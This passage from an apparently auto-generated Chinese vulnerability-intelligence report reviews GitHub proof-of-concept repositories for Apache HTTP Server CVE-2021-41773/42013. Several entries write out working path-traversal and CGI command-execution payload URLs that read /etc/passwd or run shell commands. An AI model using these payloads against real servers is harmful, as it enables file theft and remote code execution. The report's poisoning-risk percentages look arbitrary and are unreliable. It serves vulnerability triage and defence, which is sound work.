提供的POC代码是一个 Python 脚本，它利用了路径遍历漏洞来实现远程代码执行。

1.  **目标指定：** 脚本接受目标服务器的 IP 地址或域名作为参数。
2.  **命令执行：** 脚本允许用户输入要执行的命令，并通过构造包含路径遍历的 URL 将命令发送到目标服务器。
3.  **CGI利用：** 脚本假设目标服务器存在一个名为 `s3cret-cgi-bin` 的 CGI 目录，并使用该目录来执行命令。通过POST请求发送经过编码的命令，利用了`bin/sh`执行。
4.  **回显结果：** 脚本将目标服务器返回的结果打印到屏幕上。

**有效性分析：**

提供的漏洞信息和搜索结果表明，该漏洞确实存在且已被公开利用。提供的 POC 代码基本符合该漏洞的利用方式，因此可以认为该 POC 代码是有效的。需要满足相应的环境条件（如 Alias 指令配置、CGI 脚本启用、文件权限配置等）

**投毒风险分析：**

检查了提供的 Python 脚本，没有发现任何明显的恶意代码或后门。脚本的功能仅限于利用漏洞执行用户指定的命令。`README.md` 文件也只是对漏洞的简单描述，未包含恶意内容。可以认为该仓库存在投毒代码的风险非常低，风险为0%。

**排序优先级：**
搜索引擎结果提供了漏洞被广泛利用和分析的信息，漏洞利用代码验证了漏洞利用的可行性，漏洞库信息提供了漏洞的基础信息。因此，搜索引擎结果的优先级高于漏洞利用代码，漏洞利用代码的优先级高于漏洞库信息。

**项目地址:** [Iris288/CVE-2021-41773](https://github.com/Iris288/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #7

**来源**: [CVE-2021-41773-JIYUN02_cve-2021-41773.md](../2021/CVE-2021-41773-JIYUN02_cve-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历/RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的URL，绕过Alias-like指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时开启了CGI脚本执行，攻击者还可以利用该漏洞执行任意代码。

**有效性：**
提供的POC代码构建了一个包含漏洞的Apache HTTP Server 2.4.49环境。Dockerfile使用官方httpd:2.4.49镜像，并将自定义的html文件复制到/usr/local/apache2/htdocs/目录。然后，它安装了bash，并为/usr/local/apache2/htdocs/cgi-bin/test.sh添加了可执行权限。这个Dockerfile本身没有问题，但关键在于test.sh脚本的内容。如果test.sh包含恶意代码，则攻击者可以通过路径遍历漏洞执行它。

**投毒风险：**
Dockerfile只安装了bash,添加了test.sh的执行权限。如果`/tmp/4903a38a210c3406acebc545808a1928/html/cgi-bin/test.sh`脚本内容包含恶意代码，则存在投毒风险。但从dockerfile的内容来看，投毒的概率取决于test.sh,风险较低，大约在10%左右。

**利用方式：**
1.  **路径遍历：** 攻击者可以使用包含`..`序列的URL来遍历文件系统，例如：`http://target:8080/../../../../etc/passwd`，尝试读取服务器上的`/etc/passwd`文件。
2.  **远程代码执行：** 如果目标服务器启用了CGI，攻击者可以使用路径遍历来访问和执行CGI脚本，例如：`http://target:8080/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/bash -c 'id'`。

**总结：**
漏洞利用的核心在于构造包含特殊字符的URL，绕过服务器的访问控制。如果CGI可用，则可以直接执行代码。利用的成功与否取决于服务器的具体配置和文件权限。

**项目地址:** [JIYUN02/cve-2021-41773](https://github.com/JIYUN02/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #8

**来源**: [CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md](../2021/CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的目录未配置"require all denied"。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 的路径规范化更改中。攻击者可以利用路径遍历攻击将 URL 映射到由 Alias 类指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“require all denied”保护，则这些请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息，该漏洞已被在野利用，说明漏洞的利用具有实际的可能性。

**投毒风险：**
提供的POC代码是一个简单的HTML页面，显示一个404错误页面，并提示存在CVE-2021-41773漏洞。代码本身的功能是展示漏洞的存在，而不包含任何恶意代码。虽然不直接包含投毒代码，但是可能存在间接的风险，例如诱导用户访问恶意网站或执行其他恶意操作。因此，判断投毒风险为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`..`的URL，尝试访问服务器上的任意文件。例如，`http://target/../../../../etc/passwd`尝试读取`/etc/passwd`文件。
2.  **绕过访问控制：** 漏洞利用依赖于Alias指令配置的目录之外的文件没有被"require all denied"保护。如果存在疏忽配置，攻击者可以访问这些文件。
3.  **远程代码执行（可选）：** 如果目标服务器为受影响的别名路径启用了CGI脚本，攻击者可以通过上传并执行恶意CGI脚本来实现远程代码执行。

总而言之，该漏洞利用的有效性高，风险等级为高危，利用方式主要是路径遍历，如果目标环境配置不当，可能造成远程代码执行。

**项目地址:** [Mahfujurjust/CVE-2021-41773](https://github.com/Mahfujurjust/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #9

**来源**: [CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md](../2021/CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 2.4.49 版本，并启用 cgi-bin 或类似 Alias 指令配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含特殊编码的 URL，例如 `/.%2e/%2e%2e/`，来绕过服务器对路径的规范化处理，从而访问到 Alias 指令配置以外的文件。如果目标服务器同时启用了 CGI 脚本支持，则可能导致远程代码执行。

**漏洞利用有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的 POC 已被公开，并且在野外被发现利用。提供的 Postman 集合中包含了一个用于获取 `/etc/passwd` 文件的请求，验证了路径遍历的可能性。因此，提供的 POC 代码是有效的。

**投毒风险分析：**

*   `/tmp/04092c8b1881911c9b0f88964abf9b52/CVE-2021-41773.postman_collection.json`：Postman 集合文件，定义了用于测试漏洞的 HTTP 请求。不存在投毒代码。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/Dockerfile`：Dockerfile 用于构建包含漏洞环境的 Docker 镜像。 其中 `RUN ln -sf /bin/bash /bin/sh` 这一行可能存在争议，它将 `/bin/sh` 符号链接强制指向 `/bin/bash`。在某些系统中，`/bin/sh` 可能是 `dash` 或其他更轻量级的 shell。 强制指向 bash 可能会引入一些细微的兼容性问题，但这不是一个明显的恶意行为，更可能是一种为了方便某些脚本执行的措施。此外创建目录 `/etc/httpd/logs`也并不是恶意代码, 综合来看，投毒风险较低。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/LICENSE`：Apache 许可证，与漏洞利用无关，不存在投毒代码。

综合分析，该仓库中可能存在的投毒代码的可能性较低，主要集中在Dockerfile 脚本中，将`/bin/sh` 符号链接强制指向 `/bin/bash`,但可能性只有5%，其余的代码都是正常的。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/%2e%2e/` 序列的 URL，利用 Apache HTTP Server 对路径的规范化处理缺陷，尝试访问受限目录之外的文件。
2.  **敏感信息泄露：** 如果成功绕过权限验证，攻击者可以读取服务器上的敏感文件，如配置文件、密码文件等。
3.  **远程代码执行（如果 CGI 启用）：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过上传或执行恶意 CGI 脚本，实现远程代码执行。

**项目地址:** [MatanelGordon/docker-cve-2021-41773](https://github.com/MatanelGordon/docker-cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #10

**来源**: [CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md](../2021/CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且Alias-like指令配置不当，或者CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%2e`）的URL，绕过服务器的路径规范化限制，访问Alias-like指令配置目录之外的文件。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该POC代码有效。漏洞库信息明确指出该漏洞在野外被利用，搜索引擎结果也提供了多个关于该漏洞的解释和利用的文章。POC代码通过构造包含`.%2e`的URL来尝试读取目标服务器上的文件。

**投毒风险：**
分析提供的POC代码，该脚本主要功能是验证目标服务器是否存在CVE-2021-41773漏洞，脚本会检测指定的IP地址是否存在Apache HTTP Server，并尝试通过构造的URL读取指定文件。经验证，该脚本没有发现明显的恶意代码或后门，因此投毒风险较低。投毒风险百分比评估为0%。

**利用方式：**
1.  **确定目标：** 找到运行Apache HTTP Server 2.4.49的目标服务器。
2.  **构造Payload：** 构造包含恶意路径的URL，例如：`http://<target_ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  **发送请求：** 将构造好的URL发送到目标服务器。
4.  **读取文件或执行代码：** 如果目标服务器存在漏洞且配置不当，攻击者可以读取任意文件（如`/etc/passwd`）或执行任意代码（如果CGI脚本已启用）。

需要注意的是，成功利用该漏洞的前提是服务器配置不当，例如没有对Alias-like指令配置的目录之外的文件进行适当的访问控制，或者启用了CGI脚本执行功能。

总而言之，这是一个严重的安全漏洞，可能导致敏感信息泄露和远程代码执行。管理员应尽快升级Apache HTTP Server版本或采取其他缓解措施。

**项目地址:** [Maybe4a6f7365/CVE-2021-41773](https://github.com/Maybe4a6f7365/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #11

**来源**: [CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md](../2021/CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and File Disclosure

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like配置，并允许CGI脚本执行(在RCE场景下)。需要能通过网络访问目标服务器的HTTP服务。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如URL编码的双点）的URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器同时启用了CGI脚本执行，则攻击者可能进一步利用此漏洞执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码分析，可以确认此漏洞POC的有效性。漏洞库信息明确指出该漏洞已被在野利用。搜索引擎结果中也包含大量关于该漏洞的分析和POC。

**投毒风险：**
提供的代码片段是GNU通用公共许可证的文本，并非实际的漏洞利用代码。因此，无法评估其是否包含恶意代码或投毒风险。投毒的可能性为0%。该漏洞的常见利用方式是通过构造包含`..%2f`或类似编码的URL来绕过路径检查，从而访问服务器上的敏感文件，或者如果开启了CGI，甚至可以执行任意代码。 

**利用方式：**
1.  **路径遍历：** 攻击者构造包含路径遍历字符的URL，例如：`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的`/etc/passwd`文件或其他敏感文件。
2.  **远程代码执行 (RCE):**  如果服务器启用了CGI，攻击者可以将路径遍历与CGI结合，上传恶意CGI脚本，然后通过路径遍历访问该脚本，从而执行任意代码。 例如 `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` 

**项目地址:** [MrCl0wnLab/SimplesApachePathTraversal](https://github.com/MrCl0wnLab/SimplesApachePathTraversal)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #12

**来源**: [CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md](../2021/CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，Alias配置不当，且CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。由于路径规范化处理存在缺陷，攻击者可以利用该漏洞将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有被"require all denied"等默认配置保护，攻击者就可以成功访问这些文件。更严重的是，如果为这些Alias路径启用了CGI脚本，攻击者还可以执行远程代码。

**有效性：**
根据漏洞描述，该漏洞利用较为直接，通过构造包含".."的URL进行路径遍历。从搜索结果来看，存在大量的漏洞分析和利用文章，表明该漏洞利用的有效性较高。

**投毒风险：**
漏洞利用代码仅提供了漏洞分析文档、CVSS评分、环境信息、影响评估和缓解措施。其中`steps_performed.md`缺失，无法得知作者是否进行了真实的漏洞利用和测试。代码仓库主要目的是漏洞分析和缓解建议，并声明未在目标VM上安装Apache，因此实际利用代码缺失。综合判断，该仓库中存在作者隐藏恶意代码进行投毒的概率较低，预估为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造恶意的HTTP请求，包含特殊编码的路径，例如`..%2f`或`..\`，绕过服务器的路径检查，访问服务器上的任意文件。
2.  **文件泄露：** 成功利用路径遍历后，攻击者可以读取服务器上的敏感文件，如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以通过路径遍历访问CGI脚本，并执行恶意代码。攻击者可以上传包含恶意代码的CGI脚本，并通过路径遍历执行，从而获取服务器的控制权。

**项目地址:** [MuhammadHuzaifaAsif/security-lab](https://github.com/MuhammadHuzaifaAsif/security-lab)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #13

**来源**: [CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md](../2021/CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md)

## CVE-2021-41773/CVE-2021-42013 Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且开启了CGI支持，Alias配置不当，并且相关目录未进行权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773和CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造包含特殊字符（如`.%2e`或`.%%32%65`）的URL，绕过服务器的路径检查，访问到Alias指令配置以外的文件。如果目标服务器同时开启了CGI支持，攻击者还可以执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2021-41773已经被证实存在，并且在野外被利用。提供的POC代码也通过Docker构建了易受攻击的环境，并提供了利用脚本，证明了该漏洞的可利用性。

**投毒风险：**

分析POC代码，该代码主要用于构建漏洞环境和执行漏洞利用。虽然代码本身看起来直接，但需要注意以下几点：

*   **Docker镜像来源：** POC需要构建Docker镜像。如果Docker镜像不是来自官方或可信来源，则可能包含恶意软件。
*   **执行任意命令：** RCE相关的POC会执行任意命令，如果攻击者修改了POC代码，可能会导致恶意代码执行。
*   **流量劫持风险：** POC通过curl发送特定请求来触发漏洞，如果网络环境被污染，可能导致流量劫持，使得攻击者可以篡改POC行为。
*   **文件篡改风险：** RCE相关的POC会写`/tmp/exploited`文件，如果服务器的`/tmp`目录权限设置不当，攻击者可以在其他用户不知情的情况下，篡改该文件，从而进一步扩大攻击。

综合以上考虑，认为此POC代码存在一定的投毒风险，但整体比例不高，约为10%。

**利用方式：**

1.  **环境搭建：** 使用Dockerfile构建包含漏洞的Apache HTTP Server环境（2.4.49或2.4.50版本）。
2.  **路径遍历：** 构造包含特殊字符的URL，例如：
    *   `/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd` (针对CVE-2021-41773)
    *   `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` (针对CVE-2021-42013)
3.  **文件读取：** 如果路径遍历成功，可以直接读取服务器上的敏感文件。
4.  **远程代码执行（RCE）：** 如果服务器开启了CGI支持，并且允许执行shell脚本，则可以通过路径遍历访问到shell脚本，并执行任意命令。例如，POC中使用了以下命令将字符串写入/tmp/exploited文件中：
    *   `echo “Successfully Exploited” > /tmp/exploited`
5.  **利用链：** 进一步的攻击可以包括反弹shell、权限提升、横向移动等。

**项目地址:** [OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits](https://github.com/OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #14

**来源**: [CVE-2021-41773-Taldrid1_cve-2021-41773.md](../2021/CVE-2021-41773-Taldrid1_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49版本，且存在Alias-like配置，目录未配置'require all denied'，开启CGI脚本支持（RCE利用场景）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符的 URL，访问服务器上受限目录之外的文件。

**有效性：**

提供的 Nmap NSE 脚本 `cve-2021-41773.nse` 似乎有效。它通过发送包含路径遍历字符（`/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`）的 HTTP GET 请求来检测漏洞。如果服务器返回状态码 200 并且响应体包含 `/etc/passwd` 文件的内容（`root:x:0:0:root`），则该脚本将报告目标为易受攻击。

搜索引擎结果也表明此漏洞已被积极利用，并且存在公开的 PoC 代码。

**投毒风险：**

在提供的 Nmap NSE 脚本中，没有明显的投毒代码。脚本的主要功能是发送 HTTP 请求并检查响应内容。该脚本允许用户指定扫描的子网范围和输出文件，但这些参数本身不会引入任何恶意行为。脚本通过判断/etc/passwd文件是否存在root账户判断是否漏洞存在，不会造成其他影响。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（例如，`/.%2e/.%2e/.%2e/`）的 URL，试图绕过服务器的路径规范化逻辑，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码或用户数据。
3.  **远程代码执行（可选）：** 如果服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问并执行任意 CGI 脚本，从而实现远程代码执行。这通常需要结合其他漏洞或配置错误。

**优先级排序理由：**

*   **搜索引擎结果：** 提供了关于漏洞是否被利用的背景信息，以及缓解措施的链接。 *   **漏洞利用代码：** 提供了直接验证漏洞的手段，使我们能够评估其有效性。 *   **漏洞库信息：** 提供了漏洞的官方描述，受影响的版本以及参考链接。

**项目地址:** [Taldrid1/cve-2021-41773](https://github.com/Taldrid1/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #15

**来源**: [CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md](../2021/CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，且Alias-like指令配置不当或未启用"require all denied"保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，访问服务器上Alias-like指令配置以外的文件。如果这些文件没有被“require all denied”等默认安全配置保护，攻击者就可以成功读取它们。更进一步，如果CGI脚本在这些aliased路径上启用，攻击者甚至可以执行远程代码。

**有效性：**
漏洞库信息和搜索引擎结果都表明该漏洞是真实存在的，并且被广泛利用。提供的漏洞利用代码主要是一个README.md文件，描述了一个渗透测试项目，该项目评估了CVE-2021-41773和CVE-2021-42013漏洞。虽然这个README.md文件本身不是直接可用的exp代码，但是它暗示了利用该漏洞进行渗透测试是可行的。搜索引擎结果中也提到存在公开的PoC。

**投毒风险：**
README.md文件描述的是一个渗透测试过程的文档，其中包含使用Nmap、Gobuster等工具进行信息收集和漏洞评估，并没有发现直接的恶意代码。但是考虑到安全风险，该文档存在10%的投毒的可能性，因为不排除作者在文档中故意遗漏或隐藏了某些关键信息，从而误导使用者。例如,引导使用者下载特定版本的工具,该工具已经被植入后门等.

**利用方式：**
1.  **路径遍历：** 攻击者利用`..`等路径遍历字符，绕过服务器的目录限制，访问任意文件。
2.  **文件读取：**  如果目标文件未被`require all denied`等配置保护，攻击者可以读取文件内容，获取敏感信息，如配置文件、源代码等。
3.  **远程代码执行：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并执行任意命令。

利用方式通常涉及构造包含路径遍历字符的URL，例如：
`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
或
`..%2f..%2f..%2fetc/passwd`

攻击者需要根据服务器的具体配置和文件系统结构，调整路径遍历的深度和目标文件名，以成功利用该漏洞。

**项目地址:** [Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013](https://github.com/Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #16

**来源**: [CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且开启了`cgi-bin`或`icons`目录，以及未对Alias指令配置的目录进行“require all denied”限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中，是一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL（包含编码后的路径遍历字符，如`.%2e`），访问服务器上受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，则可能进一步导致远程代码执行。

**有效性：**
提供的`full.py`和`poc.py` PoC 代码尝试利用此漏洞。`full.py`脚本会读取目标列表（hosts.txt），然后针对每个目标，尝试通过 HTTP 和 HTTPS 协议，发送包含路径遍历的请求，访问`/etc/passwd`文件。如果响应中包含`root:*`字符串，则认为目标存在漏洞。

**投毒风险：**
查看提供的文件，`CODEOWNERS`和`README.md`没有发现恶意代码。 `poc.py`本身存在问题, 代码不完整，缺少发起请求的代码,有潜在风险,存在代码缺失,导致投毒或者payload失效，增加攻击者攻击复杂度。 `full.py` 脚本比较完整，但是代码质量不高，存在异常捕获 `except: pass`，可能隐藏一些错误信息。综合判断，该仓库存在一定概率的投毒风险，大约为10%。 主要体现在poc.py的请求代码缺失上，可能导致payload失效。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`.%2e`等路径遍历字符的 URL，绕过服务器对 URL 的规范化处理。
2.  **文件读取：** 成功遍历路径后，攻击者可以读取服务器上的任意文件，例如`/etc/passwd`、web 应用的配置文件等。
3.  **远程代码执行（RCE）：** 如果服务器配置允许 CGI 脚本的执行，攻击者可以上传恶意脚本，并通过路径遍历漏洞访问该脚本，从而在服务器上执行任意代码。为了实现RCE，需要满足以下条件：开启了CGI支持，并且能够通过遍历访问到CGI脚本目录，同时该目录没有被 “require all denied” 保护。

**缓解措施：**
*   升级到 Apache HTTP Server 2.4.50 或更高版本。
*   配置 `Alias` 指令时，确保使用 `Require all denied` 限制对目录的访问。
*   禁用不必要的 CGI 脚本执行。

**项目地址:** [ZephrFish/CVE-2021-41773-PoC](https://github.com/ZephrFish/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #17

**来源**: [CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md](../2021/CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，存在Alias-like指令配置，且相关目录没有“require all denied”保护。CGI脚本需要启用以进行RCE。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞源于Apache HTTP Server 2.4.49/2.4.50中路径规范化处理的缺陷。攻击者可以利用路径遍历漏洞读取服务器上的任意文件。如果服务器同时启用了CGI脚本，则可能导致远程代码执行。

**有效性分析：**

根据漏洞信息和搜索结果，该漏洞在野外被积极利用，具有较高的有效性。POC代码针对Apache 2.4.50版本，尝试利用路径遍历漏洞，首先检测CGI是否禁用，如果禁用则尝试读取/etc/passwd，如果CGI开启，则尝试执行反向shell。根据代码逻辑，该POC有一定的有效性，能检测和利用漏洞。

**投毒风险分析：**

代码中存在轻微的投毒风险。作者可能在LICENSE文件中隐藏了恶意代码，虽然该可能性较低，但是需要考虑到,或者在代码中存在一些对普通用户不友好的代码。 代码整体较为直接，没有明显的恶意行为，但仍需谨慎评估。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`.%%32%65`）的URL，绕过路径规范化检查，从而访问Alias-like指令配置以外的文件。例如，`/.%%32%65/.%%32%65/.%%32%65/etc/passwd`可以尝试读取`/etc/passwd`文件。
2.  **远程代码执行（RCE）：** 如果目标服务器启用了CGI，攻击者可以通过POST请求发送恶意代码，该代码将在服务器上执行。POC代码尝试注入一个反向shell，连接到攻击者指定的IP地址和端口。利用前提是服务器允许执行CGI脚本，并且没有对CGI脚本的执行进行严格的限制。

**项目地址:** [Zyx2440/Apache-HTTP-Server-2.4.50-RCE](https://github.com/Zyx2440/Apache-HTTP-Server-2.4.50-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #18

**来源**: [CVE-2021-41773-adrianmafandy_CVE-2021-41773.md](../2021/CVE-2021-41773-adrianmafandy_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server 2.4.49 Path Traversal & RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了 CGI 脚本支持，并且Alias配置的目录没有 require all denied 限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

